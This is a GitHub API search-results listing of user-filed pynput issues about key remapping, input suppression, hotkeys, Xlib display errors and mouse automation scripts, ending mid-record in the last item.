{"total_count": 230, "incomplete_results": false, "items": [{"url": "https://api.github.com/repos/moses-palmer/pynput/issues/295", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/295/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/295/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/295/events", "html_url": "https://github.com/moses-palmer/pynput/issues/295", "id": 671343401, "node_id": "MDU6SXNzdWU2NzEzNDM0MDE=", "number": 295, "title": "Remapper with a twist?", "user": {"login": "SpecialCharacter", "id": 30872723, "node_id": "MDQ6VXNlcjMwODcyNzIz", "avatar_url": "https://avatars1.githubusercontent.com/u/30872723?v=4", "gravatar_id": "", "url": "https://api.github.com/users/SpecialCharacter", "html_url": "https://github.com/SpecialCharacter", "followers_url": "https://api.github.com/users/SpecialCharacter/followers", "following_url": "https://api.github.com/users/SpecialCharacter/following{/other_user}", "gists_url": "https://api.github.com/users/SpecialCharacter/gists{/gist_id}", "starred_url": "https://api.github.com/users/SpecialCharacter/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/SpecialCharacter/subscriptions", "organizations_url": "https://api.github.com/users/SpecialCharacter/orgs", "repos_url": "https://api.github.com/users/SpecialCharacter/repos", "events_url": "https://api.github.com/users/SpecialCharacter/events{/privacy}", "received_events_url": "https://api.github.com/users/SpecialCharacter/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 12, "created_at": "2020-08-02T00:41:26Z", "updated_at": "2020-08-12T15:45:11Z", "closed_at": "2020-08-07T07:34:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, I noticed that remapping keys seems kind of difficult in pynput if you do not want to use `win32_event_filter` / `darwin`.\r\nI have come so far that a physical key is pressed, released, deleted, and remapped to another key.\r\nQuestion:\r\nIs it possible to put this key in a variable instead, say `key = input()[0]`, then `def press_callback(key):` and/or `def release_callback(key):` work their magic, and it puts the remapped key out? I.e. no showing and deleting of the original key?\r\nHow would an example code look like?\r\nThank you very much in advance.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/294", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/294/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/294/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/294/events", "html_url": "https://github.com/moses-palmer/pynput/issues/294", "id": 668935218, "node_id": "MDU6SXNzdWU2Njg5MzUyMTg=", "number": 294, "title": "Forwarding certain keys with no modifications?", "user": {"login": "matrixes", "id": 46491408, "node_id": "MDQ6VXNlcjQ2NDkxNDA4", "avatar_url": "https://avatars1.githubusercontent.com/u/46491408?v=4", "gravatar_id": "", "url": "https://api.github.com/users/matrixes", "html_url": "https://github.com/matrixes", "followers_url": "https://api.github.com/users/matrixes/followers", "following_url": "https://api.github.com/users/matrixes/following{/other_user}", "gists_url": "https://api.github.com/users/matrixes/gists{/gist_id}", "starred_url": "https://api.github.com/users/matrixes/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/matrixes/subscriptions", "organizations_url": "https://api.github.com/users/matrixes/orgs", "repos_url": "https://api.github.com/users/matrixes/repos", "events_url": "https://api.github.com/users/matrixes/events{/privacy}", "received_events_url": "https://api.github.com/users/matrixes/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-07-30T16:25:18Z", "updated_at": "2020-07-31T07:21:11Z", "closed_at": "2020-07-31T07:21:11Z", "author_association": "NONE", "active_lock_reason": null, "body": "Thanks for this super convenient lib! I'm having all kinds of fun with mapping up multiple keyboards and other input devices.\r\n\r\nI do however have one issue I can't seem to be able to work my way past, and that is how to \"forward\" or \"pass\" or \"ignore intercepting\" certain keys/keystrokes.\r\n\r\nMy plan is to remap a bunch of keys on a keyboard, but keep some of them intact, so that they are passed as they normally would be, keeping repeating keys when they are pushed and held, etc.\r\n\r\nThe scenario is mainly for gaming. I am planning on having a couple of breakout/3x3 keyboards that I can just switch between by moving my hand, but have different mappings on them, ready for use when needed. Now, remapping everything isn't an issue, I've had fairly good success so far. But now I want to only remap certain keys, and keep the rest untouched, such as WSAD, so that the game gets the key events without any modification.\r\n\r\nI've currently used pynput in Linux for remapping, like this:\r\n\r\n```\r\nfor event in dev.read_loop():\r\n    if event.type == ecodes.EV_KEY:\r\n        key = categorize(event)\r\n        if key.keystate == key.key_down:\r\n            if key.keycode == 'KEY_TAB':\r\n                keyboard.press('i')\r\n                keyboard.press('i')\r\n            if key.keycode == 'KEY_CAPSLOCK':\r\n                keyboard.press('o')\r\n                keyboard.release('o')\r\n...\r\n```\r\n\r\nThis has been working well for single keystrokes. But for keys that I need to press and hold, such as WSAD for movement, I haven't figured out a way yet. Is this something that's supported or would I have to come up with something else/ask for a feature of?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/291", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/291/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/291/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/291/events", "html_url": "https://github.com/moses-palmer/pynput/issues/291", "id": 663995504, "node_id": "MDU6SXNzdWU2NjM5OTU1MDQ=", "number": 291, "title": "How to hide inputs from the OS?", "user": {"login": "SpecialCharacter", "id": 30872723, "node_id": "MDQ6VXNlcjMwODcyNzIz", "avatar_url": "https://avatars1.githubusercontent.com/u/30872723?v=4", "gravatar_id": "", "url": "https://api.github.com/users/SpecialCharacter", "html_url": "https://github.com/SpecialCharacter", "followers_url": "https://api.github.com/users/SpecialCharacter/followers", "following_url": "https://api.github.com/users/SpecialCharacter/following{/other_user}", "gists_url": "https://api.github.com/users/SpecialCharacter/gists{/gist_id}", "starred_url": "https://api.github.com/users/SpecialCharacter/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/SpecialCharacter/subscriptions", "organizations_url": "https://api.github.com/users/SpecialCharacter/orgs", "repos_url": "https://api.github.com/users/SpecialCharacter/repos", "events_url": "https://api.github.com/users/SpecialCharacter/events{/privacy}", "received_events_url": "https://api.github.com/users/SpecialCharacter/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-07-22T19:24:54Z", "updated_at": "2020-07-26T22:47:12Z", "closed_at": "2020-07-26T18:48:51Z", "author_association": "NONE", "active_lock_reason": null, "body": "I want to assign `cmd_r` to a new function.\r\nUnfortunately, it also shows its 'old' behavior (opening some menu, which interferes with the new function).\r\nHow to hide such inputs from the OS?\r\nI employed the keyboard listener in the blocking version, but it does have no effect.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/290", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/290/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/290/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/290/events", "html_url": "https://github.com/moses-palmer/pynput/issues/290", "id": 661099030, "node_id": "MDU6SXNzdWU2NjEwOTkwMzA=", "number": 290, "title": "Caesar's cipher?", "user": {"login": "SpecialCharacter", "id": 30872723, "node_id": "MDQ6VXNlcjMwODcyNzIz", "avatar_url": "https://avatars1.githubusercontent.com/u/30872723?v=4", "gravatar_id": "", "url": "https://api.github.com/users/SpecialCharacter", "html_url": "https://github.com/SpecialCharacter", "followers_url": "https://api.github.com/users/SpecialCharacter/followers", "following_url": "https://api.github.com/users/SpecialCharacter/following{/other_user}", "gists_url": "https://api.github.com/users/SpecialCharacter/gists{/gist_id}", "starred_url": "https://api.github.com/users/SpecialCharacter/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/SpecialCharacter/subscriptions", "organizations_url": "https://api.github.com/users/SpecialCharacter/orgs", "repos_url": "https://api.github.com/users/SpecialCharacter/repos", "events_url": "https://api.github.com/users/SpecialCharacter/events{/privacy}", "received_events_url": "https://api.github.com/users/SpecialCharacter/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2020-07-19T22:04:20Z", "updated_at": "2020-07-31T17:40:30Z", "closed_at": "2020-07-26T18:57:06Z", "author_association": "NONE", "active_lock_reason": null, "body": "I want to recreate Caesar's cipher, where you physically press one letter, but another appears on the screen.\r\nExample: I want f to be replaced by k.\r\n\r\nThe problem is that the replacement is already triggered while the key is down (see output messages).\r\nAlso the original key is visible for a split second before I erase it with backspace (I don't know why it registers both under key and special key?).\r\n\r\nkey  **f**\r\non_press key Key.backspace pressed\r\non_press special key Key.backspace pressed\r\non_release key Key.backspace released\r\non_release special key Key.backspace released\r\non_press key '**k**' pressed\r\non_release key '**k**' released\r\non_release key '**f**' released\r\n\r\nHow do I \r\n- bring this into the right order and\r\n- preven f from being shown in the first place?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/289", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/289/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/289/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/289/events", "html_url": "https://github.com/moses-palmer/pynput/issues/289", "id": 660267669, "node_id": "MDU6SXNzdWU2NjAyNjc2Njk=", "number": 289, "title": "\ud83e\uddb6 When activate suppress, first key doesn't work", "user": {"login": "yedhrab", "id": 49655146, "node_id": "MDQ6VXNlcjQ5NjU1MTQ2", "avatar_url": "https://avatars0.githubusercontent.com/u/49655146?v=4", "gravatar_id": "", "url": "https://api.github.com/users/yedhrab", "html_url": "https://github.com/yedhrab", "followers_url": "https://api.github.com/users/yedhrab/followers", "following_url": "https://api.github.com/users/yedhrab/following{/other_user}", "gists_url": "https://api.github.com/users/yedhrab/gists{/gist_id}", "starred_url": "https://api.github.com/users/yedhrab/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/yedhrab/subscriptions", "organizations_url": "https://api.github.com/users/yedhrab/orgs", "repos_url": "https://api.github.com/users/yedhrab/repos", "events_url": "https://api.github.com/users/yedhrab/events{/privacy}", "received_events_url": "https://api.github.com/users/yedhrab/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2020-07-18T17:18:20Z", "updated_at": "2020-07-25T16:41:53Z", "closed_at": "2020-07-25T14:59:45Z", "author_association": "NONE", "active_lock_reason": null, "body": "If I run this code, I can't use <kbd>window</kbd> (`<cmd>`), key is there any option to suppress just<kbd>window</kbd> + <kbd>r</kbd> (`<cmd>+r`)\r\n```py\r\nfrom pynput.keyboard import Controller, GlobalHotKeys\r\n\r\ndef on_activate_h():\r\n    Controller().type(\"Window key doesn't work now\")\r\n\r\nwith GlobalHotKeys({'<cmd>+r': on_activate_h}) as h:\r\n    h.join()\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/286", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/286/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/286/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/286/events", "html_url": "https://github.com/moses-palmer/pynput/issues/286", "id": 655883605, "node_id": "MDU6SXNzdWU2NTU4ODM2MDU=", "number": 286, "title": "Error using the \"DISPLAY=:0 python -c 'import pynput'\" command", "user": {"login": "BrianZhang1", "id": 53130193, "node_id": "MDQ6VXNlcjUzMTMwMTkz", "avatar_url": "https://avatars2.githubusercontent.com/u/53130193?v=4", "gravatar_id": "", "url": "https://api.github.com/users/BrianZhang1", "html_url": "https://github.com/BrianZhang1", "followers_url": "https://api.github.com/users/BrianZhang1/followers", "following_url": "https://api.github.com/users/BrianZhang1/following{/other_user}", "gists_url": "https://api.github.com/users/BrianZhang1/gists{/gist_id}", "starred_url": "https://api.github.com/users/BrianZhang1/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BrianZhang1/subscriptions", "organizations_url": "https://api.github.com/users/BrianZhang1/orgs", "repos_url": "https://api.github.com/users/BrianZhang1/repos", "events_url": "https://api.github.com/users/BrianZhang1/events{/privacy}", "received_events_url": "https://api.github.com/users/BrianZhang1/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2020-07-13T14:10:52Z", "updated_at": "2020-07-13T22:50:03Z", "closed_at": "2020-07-13T16:04:16Z", "author_association": "NONE", "active_lock_reason": null, "body": "This is a continuation of error #284 , where I was directed to follow the instructions on https://pynput.readthedocs.io/en/latest/limitations.html#linux to fix my issue. Using the command: \r\nDISPLAY=:0 python -c 'import pynput'\r\nReturned another error:\r\n\r\nTraceback (most recent call last):\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/support/unix_connect.py\", line 119, in get_socket\r\n    s = _get_unix_socket(address)\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/support/unix_connect.py\", line 98, in _get_unix_socket\r\n    s.connect(address)\r\nConnectionRefusedError: [Errno 111] Connection refused\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/support/unix_connect.py\", line 123, in get_socket\r\n    s = _get_tcp_socket(host, dno)\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/support/unix_connect.py\", line 93, in _get_tcp_socket\r\n    s.connect((host, 6000 + dno))\r\nConnectionRefusedError: [Errno 111] Connection refused\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"<string>\", line 1, in <module>\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/pynput/__init__.py\", line 40, in <module>\r\n    from . import keyboard\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/pynput/keyboard/__init__.py\", line 52, in <module>\r\n    from ._xorg import KeyCode, Key, Controller, Listener\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/pynput/keyboard/_xorg.py\", line 39, in <module>\r\n    from pynput._util.xorg import (\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/pynput/_util/xorg.py\", line 40, in <module>\r\n    _check()\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/pynput/_util/xorg.py\", line 38, in _check\r\n    display = Xlib.display.Display()\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/display.py\", line 89, in __init__\r\n    self.display = _BaseDisplay(display)\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/display.py\", line 71, in __init__\r\n    protocol_display.Display.__init__(self, *args, **keys)\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/protocol/display.py\", line 89, in __init__\r\n    self.socket = connect.get_socket(name, protocol, host, displayno)\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/support/connect.py\", line 87, in get_socket\r\n    return mod.get_socket(dname, protocol, host, dno)\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/support/unix_connect.py\", line 127, in get_socket\r\n    raise error.DisplayConnectionError(dname, str(val))\r\nXlib.error.DisplayConnectionError: Can't connect to display \":0\": [Errno 111] Connection refused\r\n\r\nSomething I noticed was that when I split the command into two separate commands (DISPLAY=:0 and python -c 'import pynput'), setting the DISPLAY value returned nothing, but the second command returned the error shown above. Is this an error with my X server or something?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/285", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/285/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/285/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/285/events", "html_url": "https://github.com/moses-palmer/pynput/issues/285", "id": 655881111, "node_id": "MDU6SXNzdWU2NTU4ODExMTE=", "number": 285, "title": "Pynput is inserting < (less-than sign) before first character typed (Monitoring)", "user": {"login": "danielkovarik", "id": 35225229, "node_id": "MDQ6VXNlcjM1MjI1MjI5", "avatar_url": "https://avatars2.githubusercontent.com/u/35225229?v=4", "gravatar_id": "", "url": "https://api.github.com/users/danielkovarik", "html_url": "https://github.com/danielkovarik", "followers_url": "https://api.github.com/users/danielkovarik/followers", "following_url": "https://api.github.com/users/danielkovarik/following{/other_user}", "gists_url": "https://api.github.com/users/danielkovarik/gists{/gist_id}", "starred_url": "https://api.github.com/users/danielkovarik/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/danielkovarik/subscriptions", "organizations_url": "https://api.github.com/users/danielkovarik/orgs", "repos_url": "https://api.github.com/users/danielkovarik/repos", "events_url": "https://api.github.com/users/danielkovarik/events{/privacy}", "received_events_url": "https://api.github.com/users/danielkovarik/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-07-13T14:07:19Z", "updated_at": "2020-08-06T18:27:03Z", "closed_at": "2020-08-06T18:27:03Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello,\r\n\r\nI noticed, that when using `US (India)` keyboard layout, pynput inserts `<` (less-than sign) before the first character I type during **monitoring**. \r\n\r\nIs there anything I can do to avoid this weird behavior?\r\n\r\nFor better clarity, I am attaching a video of the issue.\r\n\r\nOS: Windows 10\r\npynput version: 1.6.8\r\nkeyboard layout: US (India) keyboard\r\n![pynput-india](https://user-images.githubusercontent.com/35225229/87313942-e339d700-c522-11ea-9678-80b793afdf53.gif)\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/284", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/284/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/284/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/284/events", "html_url": "https://github.com/moses-palmer/pynput/issues/284", "id": 655499796, "node_id": "MDU6SXNzdWU2NTU0OTk3OTY=", "number": 284, "title": "Odd pynput/xorg/Xlib error (maybe)? Can't use keyboard Listener", "user": {"login": "BrianZhang1", "id": 53130193, "node_id": "MDQ6VXNlcjUzMTMwMTkz", "avatar_url": "https://avatars2.githubusercontent.com/u/53130193?v=4", "gravatar_id": "", "url": "https://api.github.com/users/BrianZhang1", "html_url": "https://github.com/BrianZhang1", "followers_url": "https://api.github.com/users/BrianZhang1/followers", "following_url": "https://api.github.com/users/BrianZhang1/following{/other_user}", "gists_url": "https://api.github.com/users/BrianZhang1/gists{/gist_id}", "starred_url": "https://api.github.com/users/BrianZhang1/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BrianZhang1/subscriptions", "organizations_url": "https://api.github.com/users/BrianZhang1/orgs", "repos_url": "https://api.github.com/users/BrianZhang1/repos", "events_url": "https://api.github.com/users/BrianZhang1/events{/privacy}", "received_events_url": "https://api.github.com/users/BrianZhang1/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-07-12T23:44:34Z", "updated_at": "2020-07-13T11:01:03Z", "closed_at": "2020-07-13T11:01:03Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm trying to make a simple script that clicks around.  I want to make it so it will exit the program when a certain key is pressed. Here is my code:\r\n\r\nfrom pynput.mouse import Button, Controller;\r\nfrom PIL import ImageGrab;\r\nimport time;\r\nfrom pynput.keyboard import Listener;\r\nimport keyboard;\r\n\r\nmouse = Controller();\r\n\r\ntime.sleep(3);\r\n\r\nwhile True:\r\n    mouse.position = (1124, 729);\r\n    mouse.click(Button.left, 1);\r\n    mouse.position = (1001, 1026);\r\n    mouse.click(Button.left, 1);\r\n    time.sleep(1);\r\n    mouse.position = (672,730);\r\n    mouse.click(Button.left, 1);\r\n    mouse.position = (1004, 1009);\r\n    mouse.click(Button.left, 1);\r\n    time.sleep(1);\r\n    battleEndRGB = ImageGrab.grab().load()[995, 802];\r\n\r\nI tested it out to see if the import worked, disclaimer it did not. Here is the error I was given when I tried to run the python:\r\nTraceback (most recent call last):\r\n  File \"autoMaraPetsBattle.py\", line 1, in <module>\r\n    from pynput.mouse import Button, Controller;\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/pynput/__init__.py\", line 40, in <module>\r\n    from . import keyboard\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/pynput/keyboard/__init__.py\", line 52, in <module>\r\n    from ._xorg import KeyCode, Key, Controller, Listener\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/pynput/keyboard/_xorg.py\", line 39, in <module>\r\n    from pynput._util.xorg import (\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/pynput/_util/xorg.py\", line 40, in <module>\r\n    _check()\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/pynput/_util/xorg.py\", line 38, in _check\r\n    display = Xlib.display.Display()\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/display.py\", line 89, in __init__\r\n    self.display = _BaseDisplay(display)\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/display.py\", line 71, in __init__\r\n    protocol_display.Display.__init__(self, *args, **keys)\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/protocol/display.py\", line 84, in __init__\r\n    name, protocol, host, displayno, screenno = connect.get_display(display)\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/support/connect.py\", line 73, in get_display\r\n    return mod.get_display(display)\r\n  File \"/home/brianzhang/.local/lib/python3.8/site-packages/Xlib/support/unix_connect.py\", line 76, in get_display\r\n    raise error.DisplayNameError(display)\r\nXlib.error.DisplayNameError: Bad display name \"\"\r\n\r\nIf this isn't a pynput issue, I'm open to any other possibilities, just any help is much appreciated!\r\n \r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/282", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/282/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/282/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/282/events", "html_url": "https://github.com/moses-palmer/pynput/issues/282", "id": 651147247, "node_id": "MDU6SXNzdWU2NTExNDcyNDc=", "number": 282, "title": "mouse press left button ", "user": {"login": "Nobys1", "id": 67877876, "node_id": "MDQ6VXNlcjY3ODc3ODc2", "avatar_url": "https://avatars0.githubusercontent.com/u/67877876?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Nobys1", "html_url": "https://github.com/Nobys1", "followers_url": "https://api.github.com/users/Nobys1/followers", "following_url": "https://api.github.com/users/Nobys1/following{/other_user}", "gists_url": "https://api.github.com/users/Nobys1/gists{/gist_id}", "starred_url": "https://api.github.com/users/Nobys1/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Nobys1/subscriptions", "organizations_url": "https://api.github.com/users/Nobys1/orgs", "repos_url": "https://api.github.com/users/Nobys1/repos", "events_url": "https://api.github.com/users/Nobys1/events{/privacy}", "received_events_url": "https://api.github.com/users/Nobys1/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-07-05T21:15:16Z", "updated_at": "2020-07-13T11:03:09Z", "closed_at": "2020-07-13T11:03:09Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello! I was getting this issue when running this program:\r\n\r\n  File \"c:/Users/ME/Desktop/Untitled-2.py\", line 8, in <module>\r\n    mouse.press(Button.left)\r\n  File \"C:\\Users\\ME\\AppData\\Local\\Programs\\Python\\Python38-32\\lib\\site-packages\\pynput\\keyboard\\_base.py\", line 379, in press\r\n    if resolved.is_dead:\r\nAttributeError: 'NoneType' object has no attribute 'is_dead'\r\n\r\n\r\nThis is the code:\r\n\r\n\r\nfrom pynput.mouse import Button, Controller\r\n\r\nfrom pynput.keyboard import Key, Controller\r\n\r\nwhile True:\r\n    mouse = Controller()\r\n    mouse.position = (642, 464)\r\n    mouse.press(Button.left)\r\n    mouse.release(Button.left)\r\n    keyboard = Controller()\r\n    keyboard.press(Key.ctrl)\r\n    keyboard.press(\"v\")\r\n    keyboard.release(\"v\")\r\n    keyboard.release(Key.ctrl)\r\n    mouse.position = (750, 506)\r\n    mouse.press(Button.left)\r\n    mouse.release(Button.left)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/279", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/279/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/279/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/279/events", "html_url": "https://github.com/moses-palmer/pynput/issues/279", "id": 642543825, "node_id": "MDU6SXNzdWU2NDI1NDM4MjU=", "number": 279, "title": "fixup-xorg-altgr is not working in my case", "user": {"login": "krei-del", "id": 67123155, "node_id": "MDQ6VXNlcjY3MTIzMTU1", "avatar_url": "https://avatars3.githubusercontent.com/u/67123155?v=4", "gravatar_id": "", "url": "https://api.github.com/users/krei-del", "html_url": "https://github.com/krei-del", "followers_url": "https://api.github.com/users/krei-del/followers", "following_url": "https://api.github.com/users/krei-del/following{/other_user}", "gists_url": "https://api.github.com/users/krei-del/gists{/gist_id}", "starred_url": "https://api.github.com/users/krei-del/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/krei-del/subscriptions", "organizations_url": "https://api.github.com/users/krei-del/orgs", "repos_url": "https://api.github.com/users/krei-del/repos", "events_url": "https://api.github.com/users/krei-del/events{/privacy}", "received_events_url": "https://api.github.com/users/krei-del/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2020-06-21T11:20:31Z", "updated_at": "2020-06-30T13:59:33Z", "closed_at": "2020-06-30T13:59:33Z", "author_association": "NONE", "active_lock_reason": null, "body": "Is this branch \"fixup-xorg-altgr\" still working on the latest version? \r\n\r\nUnfortunately it is not working with my attached keyboard.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/278", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/278/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/278/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/278/events", "html_url": "https://github.com/moses-palmer/pynput/issues/278", "id": 642465769, "node_id": "MDU6SXNzdWU2NDI0NjU3Njk=", "number": 278, "title": "Not seeing capital letters(Upper case)", "user": {"login": "Talh21", "id": 66672445, "node_id": "MDQ6VXNlcjY2NjcyNDQ1", "avatar_url": "https://avatars1.githubusercontent.com/u/66672445?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Talh21", "html_url": "https://github.com/Talh21", "followers_url": "https://api.github.com/users/Talh21/followers", "following_url": "https://api.github.com/users/Talh21/following{/other_user}", "gists_url": "https://api.github.com/users/Talh21/gists{/gist_id}", "starred_url": "https://api.github.com/users/Talh21/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Talh21/subscriptions", "organizations_url": "https://api.github.com/users/Talh21/orgs", "repos_url": "https://api.github.com/users/Talh21/repos", "events_url": "https://api.github.com/users/Talh21/events{/privacy}", "received_events_url": "https://api.github.com/users/Talh21/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2020-06-20T23:55:14Z", "updated_at": "2020-06-27T16:24:53Z", "closed_at": "2020-06-27T16:24:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "in the log file capital letters are not seen.\r\nI can type \"Ok\" and i get \"ok\" instead.\r\nit can detect that i presses on Caps_lock but it can`t convert it.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/277", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/277/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/277/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/277/events", "html_url": "https://github.com/moses-palmer/pynput/issues/277", "id": 639726291, "node_id": "MDU6SXNzdWU2Mzk3MjYyOTE=", "number": 277, "title": "windows 10, pynput grabs '\\x16' key events? what is this?", "user": {"login": "alexisdal", "id": 5380181, "node_id": "MDQ6VXNlcjUzODAxODE=", "avatar_url": "https://avatars3.githubusercontent.com/u/5380181?v=4", "gravatar_id": "", "url": "https://api.github.com/users/alexisdal", "html_url": "https://github.com/alexisdal", "followers_url": "https://api.github.com/users/alexisdal/followers", "following_url": "https://api.github.com/users/alexisdal/following{/other_user}", "gists_url": 